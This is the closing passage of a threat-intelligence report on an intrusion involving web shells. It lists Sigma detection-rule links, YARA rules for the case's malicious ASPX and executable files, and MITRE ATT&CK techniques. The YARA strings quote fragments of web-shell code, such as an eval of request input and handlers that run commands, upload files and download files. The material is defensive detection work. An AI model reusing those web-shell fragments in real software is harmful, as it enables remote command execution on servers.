+<p>Windows Defender Real-Time Protection Disabled – <a href="https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules/windows/registry_event/registry_event_defender_realtime_protection_disabled.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules/windows/registry_event/registry_event_defender_realtime_protection_disabled.yml</a></p>
+<p>Windows Defender Threat Detection Disabled – <a href="https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules/windows/registry_event/registry_event_defender_disabled.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules/windows/registry_event/registry_event_defender_disabled.yml</a></p>
+<p>Windows Shell Spawning Suspicious Program – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_shell_spawn_susp_program.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_shell_spawn_susp_program.yml</a></p>
+<p>Windows Suspicious Use Of Web Request in CommandLine – <a href="https://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8/rules/windows/process_creation/process_creation_susp_web_request_cmd.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8/rules/windows/process_creation/process_creation_susp_web_request_cmd.yml</a></p>
+<p>Windows Webshell Creation – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/file_event/sysmon_webshell_creation_detect.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/file_event/sysmon_webshell_creation_detect.yml</a></p>
+<h3>Yara</h3>
+rule files_dhvqx {
+ meta:
+ description = "9893_files - file dhvqx.aspx"
+ author = "TheDFIRReport"
+ eference = "Case: 9893"
+ date = "2022-02-27"
+ hash1 = "c5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8"
+ strings:
+ $s1 = "eval(Request['exec_code'],'unsafe');Response.End;" fullword ascii
+ $s2 = "6&lt;script language='JScript' runat='server'&gt;" fullword ascii
+ $s3 = "AEALAAAAAAAAAAA" fullword ascii
+ $s4 = "AFAVAJA" fullword ascii
+ $s5 = "AAAAAAV" fullword ascii
+ $s6 = "LAAAAAAA" fullword ascii
+ $s7 = "ANAZAQA" fullword ascii
+ $s8 = "ALAAAAA" fullword ascii
+ $s9 = "AAAAAEA" ascii
+ $s10 = "ALAHAUA" fullword ascii
+ condition:
+ uint16(0) == 0x4221 and filesize &lt; 800KB and
+ ($s1 and $s2) and 4 of them
+}
+rule aspx_dyukbdcxjfi {
+ meta:
+ description = "9893_files - file aspx_dyukbdcxjfi.aspx"
+ author = "TheDFIRReport"
+ eference = "Case: 9893"
+ date = "2022-02-27"
+ hash1 = "84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7"
+ strings:
+ $s1 = "string[] commands = exec_code.Substring(\"run \".Length).Split(new[] { ';' }, StringSplitOptions.RemoveEmpty" ascii
+ $s2 = "string[] commands = exec_code.Substring(\"run \".Length).Split(new[] { ';' }, StringSplitOptions.RemoveEmpty" ascii
+ $s3 = "var dstFile = Path.Combine(dstDir, Path.GetFileName(httpPostedFile.FileName));" fullword ascii
+ $s4 = "info.UseShellExecute = false;" fullword ascii
+ $s5 = "using (StreamReader streamReader = process.StandardError)" fullword ascii
+ $s6 = "return httpPostedFile.FileName + \" Uploaded to: \" + dstFile;" fullword ascii
+ $s7 = "else if (exec_code.StartsWith(\"download \"))" fullword ascii
+ $s8 = "string[] parts = exec_code.Substring(\"download \".Length).Split(' ');" fullword ascii
+ $s9 = "Response.AppendHeader(\"Content-Disposition\", \"attachment; filename=\" + fileName);" fullword ascii
+ $s10 = "result = result + Environment.NewLine + \"ERROR:\" + Environment.NewLine + error;" fullword ascii
+ $s11 = "else if (exec_code == \"get\")" fullword ascii
+ $s12 = "int fileLength = httpPostedFile.ContentLength;" fullword ascii
+ condition:
+ uint16(0) == 0x4221 and filesize &lt; 800KB and
+ 8 of them
+}
+rule files_user {
+ meta:
+ description = "9893_files - file user.exe"
+ author = "TheDFIRReport"
+ eference = "Case: 9893"
+ date = "2022-02-27"
+ hash1 = "7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b"
+ strings:
+ $x1 = "PA&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt; &lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVer" ascii
+ $s2 = "\", or \"requireAdministrator\" --&gt; &lt;v3:requestedExecutionLevel level=\"requireAdministrator\" /&gt; &lt;/v3:requestedPrivileges&gt; &lt;/v3" ascii
+ $s3 = "-InitOnceExecuteOnce" fullword ascii
+ $s4 = "0\"&gt; &lt;dependency&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0." ascii
+ $s5 = "s:v3=\"urn:schemas-microsoft-com:asm.v3\"&gt; &lt;v3:security&gt; &lt;v3:requestedPrivileges&gt; &lt;!-- level can be \"asInvoker\", \"highestAvai" ascii
+ $s6 = "PB_GadgetStack_%I64i" fullword ascii
+ $s7 = "PB_DropAccept" fullword ascii
+ $s8 = "rocessorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /&gt; &lt;/dependentAssembly&gt; &lt;/dependency&gt; &lt;v3:trustInf" ascii
+ $s9 = "PB_PostEventMessage" fullword ascii
+ $s10 = "PB_WindowID" fullword ascii
+ $s11 = "?GetLongPathNameA" fullword ascii
+ $s12 = "Memory page error" fullword ascii
+ $s13 = "PPPPPPH" fullword ascii
+ $s14 = "YZAXAYH" fullword ascii
+ $s15 = "%d:%I64d:%I64d:%I64d" fullword ascii
+ $s16 = "NGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDI" ascii
+ $s17 = "PYZAXAYH" fullword ascii
+ $s18 = "PB_MDI_Gadget" fullword ascii
+ $s19 = "PA&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt; &lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVer" ascii
+ $s20 = " 46B722FD25E69870FA7711924BC5304D 787242D55F2C49A23F5D97710D972108 A2DB26CE3BBE7B2CB12F9BEFB37891A3" fullword wide
+ condition:
+ uint16(0) == 0x5a4d and filesize &lt; 300KB and
+ 1 of ($x*) and 4 of them
+}
+rule task_update {
+ meta:
+ description = "9893_files - file task_update.exe"
+ author = "TheDFIRReport"
+ eference = "Case: 9893"
+ date = "2022-02-27"
+ hash1 = "12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a"
+ strings:
+ $x1 = "&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt; &lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersi" ascii
+ $s2 = " or \"requireAdministrator\" --&gt; &lt;v3:requestedExecutionLevel level=\"requireAdministrator\" /&gt; &lt;/v3:requestedPrivileges&gt; &lt;/v3:se" ascii
+ $s3 = "-InitOnceExecuteOnce" fullword ascii
+ $s4 = "&gt; &lt;dependency&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0" ascii
+ $s5 = "v3=\"urn:schemas-microsoft-com:asm.v3\"&gt; &lt;v3:security&gt; &lt;v3:requestedPrivileges&gt; &lt;!-- level can be \"asInvoker\", \"highestAvaila" ascii
+ $s6 = "PB_GadgetStack_%I64i" fullword ascii
+ $s7 = "PB_DropAccept" fullword ascii
+ $s8 = "PB_PostEventMessage" fullword ascii
+ $s9 = "PB_WindowID" fullword ascii
+ $s10 = "?GetLongPathNameA" fullword ascii
+ $s11 = "cessorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /&gt; &lt;/dependentAssembly&gt; &lt;/dependency&gt; &lt;v3:trustInfo " ascii
+ $s12 = "Memory page error" fullword ascii
+ $s13 = "PPPPPPH" fullword ascii
+ $s14 = "YZAXAYH" fullword ascii
+ $s15 = "%d:%I64d:%I64d:%I64d" fullword ascii
+ $s16 = "PYZAXAYH" fullword ascii
+ $s17 = "PB_MDI_Gadget" fullword ascii
+ $s18 = "&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt; &lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersi" ascii
+ $s19 = " 11FCC18FB2B55FC3C988F6A76FCF8A2D 56D49E57AD1A051BF62C458CD6F3DEA9 6104990DFEA3DFAB044FAF960458DB09" fullword wide
+ $s20 = "PostEventClass" fullword ascii
+ condition:
+ uint16(0) == 0x5a4d and filesize &lt; 300KB and
+ 1 of ($x*) and 4 of them
+}
+rule App_Web_vjloy3pa {
+ meta:
+ description = "9893_files - file App_Web_vjloy3pa.dll"
+ author = "TheDFIRReport"
+ eference = "Case: 9893"
+ date = "2022-02-27"
+ hash1 = "faa315db522d8ce597ac0aa957bf5bde31d91de94e68d5aefac4e3e2c11aa970"
+ strings:
+ $x2 = "hSystem.ComponentModel.DataAnnotations, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
+ $s3 = "MSystem.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
+ $s4 = "RSystem.Xml.Linq, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
+ $s5 = "ZSystem.ServiceModel.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
+ $s6 = "YSystem.Web.DynamicData, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
+ $s7 = "XSystem.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
+ $s8 = "VSystem.Web.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii
+ $s9 = "MSystem.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii
+ $s10 = "WSystem.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii
+ $s11 = "`System.Data.DataSetExtensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
+ $s12 = "NSystem.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
+ $s13 = "ZSystem.WorkflowServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
+ $s14 = "WSystem.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
+ $s15 = "aSystem.ServiceModel.Activation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
+ $s16 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" wide /* base64 encoded string '' */
+ $s17 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" wide /* base64 encoded string '' */
+ $s18 = "aSystem.Web.ApplicationServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
+ $s19 = "\\System.EnterpriseServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii
+ $s20 = "SMicrosoft.CSharp, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii
+ condition:
+ uint16(0) == 0x5a4d and filesize &lt; 2000KB and
+ 1 of ($x*) and 4 of them
+}
+rule _user_task_update_0 {
+ meta:
+ description = "9893_files - from files user.exe, task_update.exe"
+ author = "TheDFIRReport"
+ eference = "Case: 9893"
+ date = "2022-02-27"
+ hash1 = "7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b"
+ hash2 = "12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a"
+ strings:
+ $s1 = "-InitOnceExecuteOnce" fullword ascii
+ $s2 = "PB_GadgetStack_%I64i" fullword ascii
+ $s3 = "PB_DropAccept" fullword ascii
+ $s4 = "PB_PostEventMessage" fullword ascii
+ $s5 = "PB_WindowID" fullword ascii
+ $s6 = "?GetLongPathNameA" fullword ascii
+ $s7 = "Memory page error" fullword ascii
+ $s8 = "PPPPPPH" fullword ascii
+ $s9 = "YZAXAYH" fullword ascii
+ $s10 = "%d:%I64d:%I64d:%I64d" fullword ascii
+ $s11 = "PYZAXAYH" fullword ascii
+ $s12 = "PB_MDI_Gadget" fullword ascii
+ $s13 = "PostEventClass" fullword ascii
+ $s14 = "t$hYZAXAYH" fullword ascii
+ $s15 = "$YZAXAYH" fullword ascii
+ $s16 = "Floating-point underflow (exponent too small)" fullword ascii
+ $s17 = "Inexact floating-point result" fullword ascii
+ $s18 = "Single step trap" fullword ascii
+ $s19 = "Division by zero (floating-point)" fullword ascii
+ $s20 = "tmHcI(H" fullword ascii
+ condition:
+ ( uint16(0) == 0x5a4d and filesize &lt; 300KB and ( 8 of them )
+ ) or ( all of them )
+}
+<h3>MITRE</h3>
+<ul>
+<li>Exploit Public-Facing Application – T1190</li>
+<li>OS Credential Dumping – T1003</li>
+<li>Account Manipulation – T1098</li>
+<li>Valid Accounts – T1078</li>
+<li>Ingress Tool Transfer – T1105</li>
+<li>Match Legitimate Name or Location – T1036.005</li>
+<li>Windows Service – T1543.003</li>
+<li>Web Shell – T1505.003</li>
+<li>System Information Discovery – T1082</li>
+<li>System Network Configuration Discovery – T1016</li>
+<li>System Owner/User Discovery – T1033</li>
+<li>Windows Command Shell – T1059.003</li>
+</ul>
+<p>Internal case #9893</p>
+<h3 class="sd-title">Share this:</h3><ul><li class="share-twitter"><a class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/?share=twitter&amp;nb=1" rel="nofollow noopener noreferrer" target="_blank" title="Click to share on Twitter">Twitter</a></li><li class="share-facebook"><a class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/?share=facebook&amp;nb=1" rel="nofollow noopener noreferrer" target="_blank" title="Click to share on Facebook">Facebook</a></li><li class="share-linkedin"><a class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/?share=linkedin&amp;nb=1" rel="nofollow noopener noreferrer" target="_blank" title="Click to share on LinkedIn">LinkedIn</a></li><li class="share-reddit"><a class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/?share=reddit&amp;nb=1" rel="nofollow noopener noreferrer" target="_blank" title="Click to share on Reddit">Reddit</a></li><li class="share-end"></li></ul>
+</div>
